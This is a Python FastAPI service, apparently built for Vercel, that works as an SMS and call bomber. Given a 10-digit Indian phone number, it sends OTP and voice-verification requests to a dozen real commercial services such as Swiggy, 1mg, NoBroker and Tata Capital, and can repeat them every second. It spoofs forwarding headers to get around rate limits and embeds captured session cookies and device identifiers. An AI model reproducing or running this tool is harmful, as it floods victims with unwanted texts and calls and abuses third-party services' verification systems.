import asyncio
import json
import aiohttp
import urllib.parse
from fastapi import FastAPI, HTTPException, BackgroundTasks, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional, Dict, Any, List
import logging
from contextlib import asynccontextmanager

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global variable to store active tasks
_active_tasks: Dict[str, asyncio.Task] = {}

class OTPRequest(BaseModel):
    phone_number: str
    ip_address: Optional[str] = "192.168.1.1"
    run_continuously: Optional[bool] = False

class StatusResponse(BaseModel):
    status: str
    message: str
    phone_number: Optional[str] = None
    active_tasks: Optional[int] = None

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    logger.info("Starting OTP API Service")
    yield
    # Shutdown
    logger.info("Shutting down OTP API Service")
    # Cancel all active tasks
    for task_id, task in _active_tasks.items():
        if not task.done():
            task.cancel()
            logger.info(f"Cancelled task {task_id}")

app = FastAPI(
    title="OTP Request API",
    description="API version of the OTP request script",
    version="1.0.0",
    lifespan=lifespan
)

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def get_apis(phone_number: str, ip_address: str) -> List[Dict[str, Any]]:
    """Get the list of API configurations with phone number and IP address injected"""
    apis = [
        {
            "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "payload": {
                "mobileNo": phone_number,
                "countryCode": "+91",
                "appCode": "un",
                "messageId": "1",
                "emailId": "",
                "subject": "Register",
                "priority": "1",
                "device": "web",
                "variant": "v1",
                "templateCode": 1
            },
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "identifier": "home",
                "mlang": "en",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "alang": "en",
                "country_code": "IN",
                "vlang": "en",
                "origin": "https://www.hungama.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.hungama.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Mobilenumber": phone_number,
                "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
                "Oauthtoken": "",
                "AppVersion": "245",
                "ApiVersion": "6.2.55",
                "DeviceType": "Android",
                "DeviceId": "44098bdebb2dc047",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "merucabapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "payload": {"api": "send_otp", "brand": "dayco", "mob": phone_number, "resend_otp": "resend_otp"},
            "headers": {
                "Host": "ekyc.daycoindia.com",
                "sec-ch-ua-platform": "\"Android\"",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://ekyc.daycoindia.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
                "Priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "payload": {
                "app_version": "7.10.51",
                "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
                "course": "",
                "phone_number": phone_number,
                "language": "en",
                "udid": "b751fb63c0ae17ba",
                "class": "",
                "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
            },
            "headers": {
                "version_code": "1160",
                "has_upi": "false",
                "device_model": "ASUS_I005DA",
                "android_sdk_version": "28",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "payload": {"phone": phone_number, "countryCode": "IN"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
                "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
                "origin": "https://www.nobroker.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.nobroker.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address,
                "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
            }
        },
        {
            "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "payload": {"mobileNumber": phone_number},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "Android",
                "authorization": "Bearer null",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://app.shiprocket.in",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.shiprocket.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method": "POST",
            "payload": {"phone": phone_number, "applSource": "", "isOtpViaCallAtLogin": "true"},
            "headers": {
                "Content-Type": "application/json",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
            "method": "POST",
            "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": phone_number},
            "headers": {
                "Host": "api.penpencil.co",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
            "method": "POST",
            "payload": {"number": phone_number, "is_corporate_user": False, "otp_on_call": True},
            "headers": {
                "Host": "www.1mg.com",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "payload": {"mobile": phone_number},
            "headers": {
                "Host": "profile.swiggy.com",
                "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                "pl-version": "55",
                "user-agent": "Swiggy-Android",
                "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                "version-code": "1161",
                "app-version": "4.38.1",
                "latitude": "0.0",
                "longitude": "0.0",
                "os-version": "13",
                "accessibility_enabled": "false",
                "swuid": "4c27ae3a76b146f3",
                "deviceid": "4c27ae3a76b146f3",
                "x-network-quality": "GOOD",
                "accept-encoding": "gzip",
                "accept": "application/json; charset=utf-8",
                "content-type": "application/json; charset=utf-8",
                "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
            "method": "POST",
            "payload": {"phone_number": {"number": phone_number, "country_code": "+91"}},
            "headers": {
                "Host": "api.kpnfresh.com",
                "sec-ch-ua-platform": "\"Android\"",
                "cache": "no-store",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "x-channel-id": "WEB",
                "sec-ch-ua-mobile": "?1",
                "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
                "accept": "*/*",
                "origin": "https://www.kpnfresh.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.kpnfresh.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
                "Host": "api.servetel.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        }
    ]
    return apis

async def send_request(session: aiohttp.ClientSession, api: Dict[str, Any]) -> tuple[Optional[int], Dict[str, Any]]:
    """Send a single request to an API endpoint"""
    try:
        if api["method"] == "POST":
            if api["headers"].get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in api["payload"].items())
                api["headers"]["Content-Length"] = str(len(payload_str.encode('utf-8')))
                async with session.post(
                    api["endpoint"], 
                    data=payload_str, 
                    headers=api["headers"], 
                    timeout=aiohttp.ClientTimeout(total=5),
                    ssl=False
                ) as response:
                    return response.status, api
            else:
                async with session.post(
                    api["endpoint"], 
                    json=api["payload"], 
                    headers=api["headers"], 
                    timeout=aiohttp.ClientTimeout(total=5),
                    ssl=False
                ) as response:
                    return response.status, api
        else:
            logger.warning(f"Unsupported method {api['method']} for {api['endpoint']}")
            return None, api
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.error(f"Request failed for {api['endpoint']}: {str(e)}")
        return None, api
    except Exception as e:
        logger.error(f"Unexpected error for {api['endpoint']}: {str(e)}")
        return None, api

async def run_otp_requests(phone_number: str, ip_address: str, run_continuously: bool = False):
    """Run OTP requests with the same logic as the original script"""
    task_id = f"{phone_number}_{ip_address}"
    
    try:
        logger.info(f"Starting OTP requests for {phone_number}")
        apis = get_apis(phone_number, ip_address)
        
        async with aiohttp.ClientSession() as session:
            while True:
                tasks = [send_request(session, api) for api in apis]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                new_apis = []
                for result in results:
                    if isinstance(result, Exception):
                        logger.error(f"Task raised exception: {result}")
                        continue
                    
                    status_code, api = result
                    if status_code in [200, 201]:
                        new_apis.append(api)
                        logger.info(f"Success: {api['endpoint']} - Status: {status_code}")
                    elif status_code is not None:
                        logger.warning(f"Removing {api['endpoint']} due to status code {status_code}")
                
                apis = new_apis
                if not apis:
                    logger.info("All APIs have been removed due to non-200/201 status codes.")
                    break
                
                if not run_continuously:
                    # Run only once if not continuous
                    break
                    
                # Small delay between runs if continuous
                await asyncio.sleep(1)
                
    except asyncio.CancelledError:
        logger.info(f"Task {task_id} was cancelled")
    except Exception as e:
        logger.error(f"Error in OTP requests for {phone_number}: {str(e)}")
    finally:
        # Clean up task from active tasks
        _active_tasks.pop(task_id, None)

@app.get("/")
async def root():
    """Root endpoint"""
    return {
        "status": "running",
        "service": "OTP Request API",
        "endpoints": {
            "start": "POST /start",
            "stop": "POST /stop/{phone_number}",
            "status": "GET /status",
            "single": "POST /single"
        }
    }

@app.post("/start")
async def start_otp_requests(request: OTPRequest, background_tasks: BackgroundTasks):
    """Start OTP requests for a phone number"""
    # Validate phone number
    if not request.phone_number.isdigit() or len(request.phone_number) != 10:
        raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
    
    task_id = f"{request.phone_number}_{request.ip_address}"
    
    # Check if task already exists
    if task_id in _active_tasks and not _active_tasks[task_id].done():
        return StatusResponse(
            status="already_running",
            message=f"OTP requests already running for {request.phone_number}",
            phone_number=request.phone_number,
            active_tasks=len(_active_tasks)
        )
    
    # Create and start the task
    task = asyncio.create_task(run_otp_requests(
        request.phone_number, 
        request.ip_address, 
        request.run_continuously
    ))
    _active_tasks[task_id] = task
    
    return StatusResponse(
        status="started",
        message=f"OTP requests started for {request.phone_number}",
        phone_number=request.phone_number,
        active_tasks=len(_active_tasks)
    )

@app.post("/single")
async def single_otp_request(request: OTPRequest):
    """Send a single round of OTP requests (non-continuous)"""
    # Validate phone number
    if not request.phone_number.isdigit() or len(request.phone_number) != 10:
        raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
    
    try:
        apis = get_apis(request.phone_number, request.ip_address)
        results = []
        
        async with aiohttp.ClientSession() as session:
            tasks = [send_request(session, api) for api in apis]
            responses = await asyncio.gather(*tasks)
            
            for status_code, api in responses:
                results.append({
                    "endpoint": api["endpoint"],
                    "status_code": status_code,
                    "success": status_code in [200, 201]
                })
        
        success_count = sum(1 for r in results if r["success"])
        
        return {
            "status": "completed",
            "phone_number": request.phone_number,
            "total_requests": len(results),
            "successful_requests": success_count,
            "results": results
        }
        
    except Exception as e:
        logger.error(f"Error in single OTP request: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/stop/{phone_number}")
async def stop_otp_requests(phone_number: str, ip_address: str = "192.168.1.1"):
    """Stop OTP requests for a specific phone number"""
    task_id = f"{phone_number}_{ip_address}"
    
    if task_id in _active_tasks:
        task = _active_tasks[task_id]
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        
        _active_tasks.pop(task_id, None)
        
        return StatusResponse(
            status="stopped",
            message=f"OTP requests stopped for {phone_number}",
            phone_number=phone_number,
            active_tasks=len(_active_tasks)
        )
    else:
        raise HTTPException(
            status_code=404,
            detail=f"No active OTP requests found for {phone_number}"
        )

@app.get("/status")
async def get_status():
    """Get current status of the service and active tasks"""
    active_tasks_info = []
    for task_id, task in _active_tasks.items():
        phone, ip = task_id.split("_", 1)
        active_tasks_info.append({
            "phone_number": phone,
            "ip_address": ip,
            "running": not task.done(),
            "cancelled": task.cancelled()
        })
    
    return {
        "status": "running",
        "active_tasks": len(_active_tasks),
        "tasks": active_tasks_info
    }

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "timestamp": asyncio.get_event_loop().time()}

# For Vercel serverless compatibility
# The app object is named 'app' and will be detected by Vercel
